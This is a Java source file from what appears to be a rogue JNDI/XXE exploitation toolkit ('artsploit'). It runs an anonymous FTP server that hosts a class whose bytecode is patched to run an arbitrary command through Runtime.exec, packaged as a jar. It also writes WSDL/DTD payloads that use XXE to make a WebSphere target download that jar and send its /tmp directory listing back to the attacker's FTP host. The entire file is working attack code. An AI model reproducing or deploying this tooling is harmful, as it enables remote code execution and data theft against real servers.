package artsploit;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.ftpserver.ConnectionConfigFactory;
import org.apache.ftpserver.FtpServer;
import org.apache.ftpserver.FtpServerFactory;
import org.apache.ftpserver.listener.ListenerFactory;
import org.apache.ftpserver.ftplet.FtpException;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.concurrent.Executors;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

import org.apache.ftpserver.usermanager.impl.BaseUser;
import org.apache.mina.filter.executor.OrderedThreadPoolExecutor;
import org.apache.tomcat.jni.File;

import static org.apache.commons.text.StringEscapeUtils.escapeJava;

public class FTPServer {
	private static FtpServer server;
	byte[] exportByteCode;
	byte[] exportJar;

	public static void start() throws Exception {
		System.out.println("Starting FTP server on 0.0.0.0:" + Config.httpPort);
		FtpServerFactory serverFactory = new FtpServerFactory();
		ListenerFactory factory = new ListenerFactory();
		factory.setPort(Config.httpPort);
		serverFactory.addListener("default", factory.createListener());
		ConnectionConfigFactory connectionConfigFactory = new ConnectionConfigFactory();
		connectionConfigFactory.setAnonymousLoginEnabled(true);

		serverFactory.setConnectionConfig(connectionConfigFactory.createConnectionConfig());

		Path path = Files.createTempDirectory("jndi");
		System.out.println("Path is at: " + path.toAbsolutePath());
		createHandles(path);

		BaseUser user = new BaseUser();
		user.setName("anonymous");
		user.setHomeDirectory(path.toAbsolutePath().toString());
		serverFactory.getUserManager().save(user);


		server = serverFactory.createServer();

		server.start();
	}

	public FTPServer() throws Exception {
		exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
		exportJar = createJar(exportByteCode, "xExportObject");
	}

	/**
	 * Patch the bytecode of supplied class constructor by injecting execution of a command
	 */
	static byte[] patchBytecode(Class clazz, String command, String newName) throws Exception {

		//load ExploitObject.class bytecode
		ClassPool classPool = ClassPool.getDefault();
		CtClass exploitClass = classPool.get(clazz.getName());

		//patch its bytecode by adding a new command
		CtConstructor m = exploitClass.getConstructors()[0];
		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
		exploitClass.setName(newName);
		exploitClass.detach();
		return exploitClass.toBytecode();
	}

	/**
	 * Create an executable jar based on supplied bytecode
	 */
	static byte[] createJar(byte[] exportByteCode, String className) throws Exception {

		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		JarOutputStream jarOut = new JarOutputStream(bout);
		jarOut.putNextEntry(new ZipEntry(className + ".class"));
		jarOut.write(exportByteCode);
		jarOut.closeEntry();
		jarOut.close();
		bout.close();

		return bout.toByteArray();
	}

	 public static void createHandles(Path path) {
	 	try {
	 		String full_path = path.toAbsolutePath().toString();

			byte[] exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
			byte[] exportJar = createJar(exportByteCode, "xExportObject");

	 		String filename = "/xExportObject.class";
			try (FileOutputStream fos = new FileOutputStream(full_path + filename)) {
				fos.write(exportByteCode);
			}
//	 		httpExchange.getResponseBody().write(exportByteCode);

	 		filename = "/xExportObject.jar";
			try (FileOutputStream fos = new FileOutputStream(full_path + filename)) {
				fos.write(exportJar);
			}
//	 		httpExchange.getResponseBody().write(exportJar);

	 		filename = "/upload.wsdl";
	 		//payload for artsploit.controllers.WebSphere1-2
			//intended to upload xExploitObject.jar into the /temp directory on server
	 		String uploadWsdl = "<!DOCTYPE a SYSTEM \"jar:ftp://" + Config.hostname + ":" + Config.httpPort +
	 						"/xExploitObject.jar!/file.txt\"><a></a>";
			try (FileOutputStream fos = new FileOutputStream(full_path + filename)) {
				fos.write(uploadWsdl.getBytes());
			}
//	 		httpExchange.getResponseBody().write(uploadWsdl.getBytes());

	 		filename = "/xx.http";
			//payload for artsploit.controllers.WebSphere1-2
			//second part for upload.wsdl
			String xxhttp = "<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\"uri\" location=\"ftp://" +
	 						Config.hostname + ":" + Config.httpPort + "/xxeLog?%aaa;\"/>&#39;>'>%ccc;";
			try (FileOutputStream fos = new FileOutputStream(full_path + filename)) {
				fos.write(xxhttp.getBytes());
			}
//	 		httpExchange.getResponseBody().write(xxhttp.getBytes());

	 		filename = "/list.wsdl";
	 		//payload for artsploit.controllers.WebSphere1-2
			//intended to list files in the /temp directory on server
			String listWsdl = "" +
					"<!DOCTYPE x [\n" +
					"  <!ENTITY % aaa SYSTEM \"file:///tmp/\">\n" +
					"  <!ENTITY % bbb SYSTEM \"ftp://" + Config.hostname + ":" + Config.httpPort + "/xx.http\">\n" +
					"  %bbb;\n" +
					"]>\n" +
					"<definitions name=\"HelloService\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n" +
					"  &ddd;\n" +
					"</definitions>";
			try (FileOutputStream fos = new FileOutputStream(full_path + filename)) {
				fos.write(listWsdl.getBytes());
			}
//			httpExchange.getResponseBody().write(listWsdl.getBytes());

	 	} catch(Exception e) {
	 		e.printStackTrace();
	 	}
	 }
}
